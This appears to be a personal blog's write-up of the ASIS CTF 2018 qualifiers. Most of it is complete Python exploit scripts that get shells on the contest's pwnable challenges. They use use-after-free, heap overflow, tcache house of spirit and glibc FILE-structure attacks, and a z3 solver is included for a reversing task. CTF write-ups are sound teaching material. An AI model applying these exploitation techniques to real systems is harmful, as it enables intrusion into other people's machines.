---
layout:     post
title:      "ASIS CTF 2018 quals Write Up"
subtitle:   "Asis CTF 2018 quals pwnable/reversing"
date:       2018-04-24
author:     "NextLine"
header-img: "img/post-bg-6.jpg"
tags:
    - WriteUp
---

# 2018 ASIS CTF quasl Write Up

### info

![ScoreBoard](/img/in-post/asisctf/ScoreBoard.png)
Nickname : AshuuLee<br>
Rank : 16<br>
I solved all challs about pwnable and reversing.<br>


### Cat (67 pts)

```python
from ntpwn import *

#s = process('./cat')
s = remote('178.62.40.102',6000)
#b = BP(s)
#b.bp('tracemalloc on')
#b.done()

def create(name,kind,old):
	s.sendlineafter('> ','1')
	s.sendlineafter('> ',name)
	s.sendlineafter('> ',kind)
	s.sendlineafter('> ',old)

def edit(index,name,kind,old,yorn):
	s.sendlineafter('> ', '2')
	s.sendlineafter('> ', str(index))
	s.sendlineafter('> ', name)
	s.sendlineafter('> ', kind)
	s.sendlineafter('> ', old)
	s.sendlineafter('> ', yorn)

def printn(index):
	s.sendlineafter('> ', '3')
	s.sendlineafter('> ', str(index))

def printall():
	s.sendlineafter('> ', '4')

def delete(index):
	s.sendlineafter('> ', '5')
	s.sendlineafter('> ', str(index))

debug()
e = ELF('./cat')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pause()
create('A','B','C')
edit(0,'1','1','1','n')
create('A',p64(0x6020b0) + p64(0x602100),'C')

edit(0,p64(0x602100),p64(e.got['puts']) * 2,'1234','y')
printn(2)
s.recvuntil('> name: ')
libc = u64(s.recv(6) + "\x00" * 2) - l.symbols['puts']
log.info("libc : " + hex(libc))

edit(0,'1','1','1','n')
create('A',p64(e.got['atoi']) + p64(0x602200),'C')

s.sendlineafter('> ', '2')
s.sendlineafter('> ', '0')
s.sendlineafter('> ', p64(libc + l.symbols['system']))
s.sendlineafter('> ', 'AAAA')
s.sendlineafter('> ', 'sh')

s.interactive()
# ASIS{5aa9607cca34dba443c2b757a053665179f3f85c}
```

- Use-After-Free



### FCascasde (112 pts)

```python
from ntpwn import *

#s = process('./fstream')
s = remote('178.62.40.102',6002)
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
'''
b = BP(s)
#b.bp64(0xa4c) #read
#b.bp64(0xb17) #read2
b.bp('tracemalloc on')
b.done()
'''

def go(cmd):
	s.sendlineafter('> ',cmd)

pause()

go('11010110')
go('A' * 0x88)
s.recvuntil('A' * 0x88)
canary = u64(s.recv(8)) - 0xa
log.info('canary : ' + hex(canary))

go('A' * 0x98)
s.recvuntil('A' * 0x98)
libc = u64(s.recv(6) + "\x00" * 2) - 0x2080a
log.info('libc : ' + hex(libc))

go('11111111')
go('10110101')
go(str(libc+l.symbols['_IO_2_1_stdin_']+56+1))

payload = p64(libc+l.symbols['_IO_2_1_stdin_'] + 131) * 3
payload += p64(libc+l.symbols['__free_hook'] )
payload += p64(libc+l.symbols['__free_hook'] + 8)
s.send(payload)

oneshot = libc + 0x4526a
log.info("oneshot : "+ hex(oneshot))
s.sendline("\x00" * (8 * 21) + p64(oneshot))

s.interactive()

# ASIS{1b706201df43717ba2b6a7c41191ec1205fc908d}
```

- write null byte to "IO_buf_base" in stdin



### Fifty Dollars (161 pts)

```python
from ntpwn import *

#s = process('./fd')
s = remote('178.62.40.102',6001)
'''
b = BP(s)
b.bp('tracemalloc on')
b.bp('b * _IO_flush_all_lockp+612')
#b.bp('b *_int_malloc')
#b.bp('b *_int_malloc+583')
b.done()
'''

l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def alloc(idx,content):
	s.sendlineafter(':','1')
	s.sendlineafter(':',str(idx))
	s.sendafter(':',content)

def show(idx):
	s.sendlineafter(':','2')
	s.sendlineafter(':',str(idx))

def free(idx):
	s.sendlineafter(':','3')
	s.sendlineafter(':',str(idx))

alloc(0,p64(0x60) * 10) # no null byte
alloc(0,p64(0x60) * 10)
alloc(1,p64(0x60) * 10)
alloc(2,p64(0x60) * 2 +p64(0) * 2+ p64(0x31) * 2 + p64(0x21) * 4)

free(0)
free(1)
show(1) # uaf & heap leak
heap = u64(s.recv(6)+"\x00" * 2)
log.info("HEAP : " + hex(heap))

free(0) # fastbin dup into heap
alloc(0,p64(heap+0x40))
alloc(0,p64(0x60) * 10)
alloc(0,p64(0x60) * 8 + p64(heap + 64))

alloc(0,p64(heap + 0xe0)+ p64(0) * 2 + p64(0xa1))
# chunk overlap & overwrite chunk size & fastbin dup into heap
free(1) # make unsorted bin
#s.interactive()

show(1) # leak libc
libc = u64(s.recv(6)+"\x00" * 2) - l.symbols['__malloc_hook'] - 0x68
oneshot = libc + 0xf1147
log.info("libc : " + hex(libc))
log.info("oneshot : " + hex(oneshot))


payload = p64(oneshot) * 2
payload += '/bin/sh\x00' + p64(0x68)
payload += p64(0) + p64(libc + l.symbols['_IO_list_all'] - 0x10)
alloc(0, payload)

free(2)
payload = p64(0x60) * 4 + p64(0) * 6
alloc(0, payload)

payload = p64(0) * 2
payload += p64(heap + 0xe0)
payload += p64(0) * 3 + p64(1)
payload += p64(0x0) * 2
payload += p64(heap + 0x110 - 0xb0 - 0x20)
alloc(0, payload)
pause()

s.sendlineafter(':','1')
s.sendlineafter(':','1')
s.interactive()
# ASIS{62a24e96d0e582082826a67f968b334bbc965b19}
```

- double free / unsorted bin attack to "IO_list_all"



### My Blog (148 pts)

```python
from pwn import *
from ctypes import *

#s = process('./myblog')
s = remote('159.65.125.233',31337)
'''
b = BP(s)
b.bp('tracemalloc on')
#b.bp('b *delete+76')
b.bp64(0x1063)
b.done()
'''

libc = CDLL("libc.so.6")
libc.srand(libc.time(0));
box = libc.rand() & 0xFFFFF000
log.info("BOX : 0x%x" % box)

context.arch = "amd64"
sh_r = shellcraft.read(0,box,0x100)

sh = '	nop\n' * 0x30
#sh += shellcraft.pushstr('/home/youngjoo/pwn/ctf/youngjoo/flag')
sh += shellcraft.pushstr('/home/pwn/flag')
sh += shellcraft.openat(0,'rsp', 0)
sh += shellcraft.read('rax', box+0x100, 100)
sh += shellcraft.write(1, box+0x100, 100)
sh += shellcraft.exit(0)

def write(content,author):
	s.sendlineafter('Exit\n','1')
	s.sendafter('t\n',content)
	s.sendlineafter('r\n',author)

def dele(idx):
	s.sendlineafter('Exit\n','2')
	s.sendlineafter('x\n',idx)

def show(name, leak=False):
	r = ''
	s.sendlineafter('Exit\n','3')
	s.recvuntil('Old Owner : ')

	if leak == True:
		r = u64(s.recvline()[:-1] + "\x00"*2)
	s.sendafter('New Owner : \n',name)
	return r

def hid():
	s.sendlineafter('Exit\n','31337')
	s.recvuntil('gift 0x')
	r = int(s.recvline()[:-1],16)
	return r

pause()
# make fake chunk
for i in range(0x41):
	write("A" * 8, "B" * 4)

# pie leak
pie = hid() - 0xef4
print hex(pie)
log.info("PIE : 0x%x" % pie)
s.sendline('A')

# t-cache house of spirit
show(p64(pie+0x202040)[:-1])
dele('-1')

# heap leak
write("A" * 8 + p8(8),"C")
heap = show(p64(pie+0x202040)[:-1],leak=True)
log.info("HEAP : 0x%x" % heap)
dele('-1')

# t-cache duplication
write("A" * 8 + p8(8),"C")
show(p64(heap+0x100)[:-1])
dele('-1')
show(p64(0x41)[:-1])
dele('0')
dele('1')

# t-cache house of spirit
write(p64(box+0x10),"C")
write(p64(box+0x10),"C")
write(p64(box+0x10),"C")
write("A","C")
dele('64')
write(asm(sh_r),"C")

# buffer overflow
hid()
s.send("A" * 0x10 + p64(box+0x10)[:-1])

# shellcode
s.sendlineafter('Done!!\n',asm(sh))
s.interactive()
# ASIS{526eb5559eea12d1e965fe497b4abb0a308f2086}
```

- tcache exploit (this challs is made by me)



### TinyPwn (138 pts)

```python
from ntpwn import *

#s = process('./TinyPwn')
s = remote('159.65.125.233',6009)
'''
b = BP(s)
b.bp64(0x10a)
b.done(c=False)
'''

pause()
payload = '/bin/sh\x00'.ljust(0x128,'A')
payload += p64(0x4000ed)
payload = payload.ljust(0x142,'B')
s.send(payload)

s.interactive()
# ASIS{9cea1dd8873d688649e7cf738dade84a33a508fb}
```

- execveat



### Just Sort! (176 pts)

```python
from ntpwn import *

#s = process('./just_sort')
s = remote('159.65.125.233',6005)

def insert(size,content):
	s.sendlineafter('> ','1')
	s.sendlineafter('> ',str(size))
	s.sendafter('> ',content)

def edit(size,position,content):
	s.sendlineafter('> ','2')
	s.sendlineafter('> ',str((size/10)))
	s.sendlineafter('> ',str(position))
	s.sendafter('> ',content)

def view():
	s.sendlineafter('> ','3')

def search(size,content):
	s.sendlineafter('> ','4')
	s.sendlineafter('> ',str(size))
	s.sendafter('> ',content)

def delete(size,position):
    s.sendlineafter('> ','5')
    s.sendlineafter('> ',str((size/10)))
    s.sendlineafter('> ',str(position))

'''
b = BP(s)
b.bp('tracemalloc on')
b.done()
'''

e = ELF('./just_sort')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pause()
insert(0x10,'A' * 0x10)
insert(0x10,'A' * 0x10)
insert(0x10,'A' * 0x10)

delete(0x10,0)

payload = p64(0) + p64(e.got['atoi']) + p64(8)
payload += p64(0x21)
payload += 'C' * 0x18
payload += p64(0x21)
payload += p8(0x30)
search(0x10, payload)

insert(0x10,p64(0))
view()
s.recvuntil('    1: "')
libc = u64(s.recv(6) + "\x00" * 2) - l.symbols['atoi']
log.info("LIBC : " + hex(libc))

edit(0x10,1,p64(libc + l.symbols['system']))
s.sendline('sh')

s.interactive()
# ASIS{67d526ef0e01f2f9bdd7bff3829ba6694767f3d1}
```

- heap overflow



### Message me (195 pts)

```python
from ntpwn import *

#s = process('./message_me')
s = remote('159.65.125.233',6003)

def add(size,content):
	s.sendlineafter('choice :','0')
	s.sendlineafter(': ',str(size))
	s.sendlineafter(': ',str(content))

def remove(idx):
	s.sendlineafter('choice :','1')
	s.sendlineafter(': ',str(idx))

def show(idx):
	s.sendlineafter('choice :','2')
	s.sendlineafter(': ',str(idx))

def change(idx):
	s.sendlineafter('choice :','3')
	s.sendlineafter(': ',str(idx))

'''
b = BP(s)
b.bp('tracemalloc on')
b.done()
'''

l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#l = ELF('./libc')

pause()

add(0x100,'A')
add(0x30,'A')
show(0)
remove(0)

show(0)
s.recvuntil('Message : ')
libc = u64(s.recv(6) + "\x00" * 2)-l.symbols['__malloc_hook']-0x168
log.info("LIBC : " + hex(libc))

# fd overwrite
add(0x60,p64(0x71)+p64(libc+l.symbols['_IO_2_1_stdin_']+157))
add(0x60,'A')
remove(2)
remove(3)

# add 0x10
change(3)
change(3)
change(3)

add(0x60,'A')
add(0x60,'A')

oneshot = libc+0xf02a4
payload = '\x00' * 0xb
payload += p64(0xffffffff) + p64(0) * 2
payload += p64(libc+l.symbols['_IO_2_1_stdin_']+208)
payload += p64(oneshot) * 8

add(0x60,payload)

s.interactive()
# ASIS{321ba5b38c9e4db97c5cc995f1451059b4e28f6a}
```

- Use-After-Free



### Density (148 pts)

```python
from z3 import *

tb = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
tb2 = "@$_!\"#%&'()*+,-./:;<=>?\n"
tb3 = "[\\]^{|}~`\t"
en = [0x3b, 0xef, 0xa1, 0xf9, 0xbf, 0xaa, 0x70, 0x4, 0x88, 0x4b, 0xef, 0x9e, 0xd3, 0x57, 0x7e, 0x73, 0x83, 0x5d, 0xf9, 0xc1, 0xa8, 0x2c, 0x3f, 0x9c, 0x1, 0x22, 0x12, 0xf9, 0xcd, 0x43, 0x7b, 0x8f, 0x9c, 0xe0, 0x7e, 0x2d, 0xf9, 0xc8, 0x34, 0x7b, 0x9f, 0x9c, 0x7f, 0x4a, 0xfe, 0x72, 0x5b, 0x3e, 0x77, 0xef, 0xa0, 0x74, 0x8f, 0xbe, 0x8f, 0xe9, 0xc, 0xfa, 0xf6, 0xfe, 0xf9, 0xf0, 0xfd, 0x5b, 0xea, 0xbf, 0xa]
_len = 4 * (len(en) / 3)

key = [0 for i in range(_len)]
for i in xrange(_len):
	key[i] = BitVec('key[{}]'.format(i), 8)

s = Solver()

for i in xrange(_len):
	s.add(0 <= key[i], key[i] < len(tb))

for i in xrange(_len / 4):
	s.add(en[(i*3)] == ((key[(i*4)] * 0x4) | (key[(i*4)+1] >> 4)))
	s.add(en[(i*3)+1] == ((key[(i*4)+1] * 0x10) % 0x100) | (key[(i*4)+2] >> 2))
	s.add(en[(i*3)+2] == ((key[(i*4)+2] * 0x40 % 0x100) | key[(i*4)+3]))

print "CHECK : " + str(s.check())
m = s.model()

de = ''
for i in xrange(_len):
	de += tb[int(str(m[key[i]]))]

print "RESULT : " + de

while True:
	fn = de.find('++')
	if fn == -1:
		break
	de = de.replace(de[fn:fn+3],tb3[ord(de[fn+2]) - ord('a')])

while True:
	fn = de.find('+')
	if fn == -1:
		break
	de = de.replace(de[fn:fn+2],tb2[ord(de[fn+1]) - ord('a')])

print de
```



### Other

#####  The rest of the challs was solved only through debugging.




